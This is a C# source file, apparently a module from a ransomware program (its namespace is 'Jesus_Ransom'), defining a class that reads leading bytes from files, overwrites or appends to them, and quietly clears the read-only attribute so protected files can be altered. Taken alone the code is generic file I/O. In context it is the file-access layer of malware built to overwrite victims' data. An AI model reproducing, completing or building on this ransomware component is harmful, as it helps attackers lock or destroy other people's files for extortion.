using System.IO;

namespace Jesus_Ransom;

public class RAWFiles
{
	private static readonly object fsLock = new object();

	public static byte[] ReadFile(string path, int count)
	{
		ReadToWriter(path);
		using FileStream fileStream = new FileStream(path, FileMode.Open);
		byte[] array = new byte[count];
		lock (fsLock)
		{
			fileStream.Seek(0L, SeekOrigin.Begin);
			fileStream.Read(array, 0, count);
		}
		fileStream.Close();
		return array;
	}

	public static void WriteFile(string path, byte[] bytes, bool append)
	{
		lock (fsLock)
		{
			if (append)
			{
				using (FileStream fileStream = new FileStream(path, FileMode.OpenOrCreate, FileAccess.ReadWrite))
				{
					fileStream.Write(bytes, 0, bytes.Length);
					fileStream.Close();
					return;
				}
			}
			using FileStream fileStream2 = new FileStream(path, FileMode.Create, FileAccess.Write);
			fileStream2.Write(bytes, 0, bytes.Length);
			fileStream2.Close();
		}
	}

	private static void ReadToWriter(string path)
	{
		FileAttributes attributes = File.GetAttributes(path);
		if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
		{
			attributes = RemoveAttribute(attributes, FileAttributes.ReadOnly);
			File.SetAttributes(path, attributes);
		}
	}

	private static FileAttributes RemoveAttribute(FileAttributes attributes, FileAttributes attributesToRemove)
	{
		return attributes & ~attributesToRemove;
	}
}
